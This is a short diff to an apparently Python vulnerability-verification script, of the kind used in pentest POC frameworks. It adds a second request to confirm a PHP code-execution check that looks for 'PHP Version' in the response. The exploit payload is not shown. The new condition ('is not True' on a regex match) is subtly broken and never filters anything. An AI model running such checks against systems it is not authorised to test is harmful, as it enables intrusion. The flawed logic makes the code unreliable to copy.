@@ -16,7 +16,8 @@ def verify(url):
             'Content-Type': 'application/x-www-form-urlencoded',
         }
         response = requests.post(target, data=payload, timeout=3, verify=False, headers=headers)
-        if re.search(r'PHP Version', response.text):
+        response2 = requests.post(target, timeout=3, verify=False, headers=headers)
+        if re.search(r'PHP Version', response.text) and re.search(r'PHP Version', response2.text) is not True:
             relsult['vulnerable'] = True
             relsult['method'] = 'POST'
             relsult['url'] = target
@@ -48,4 +49,5 @@ def attack(url):
             return True
     else:
         return False
+
 
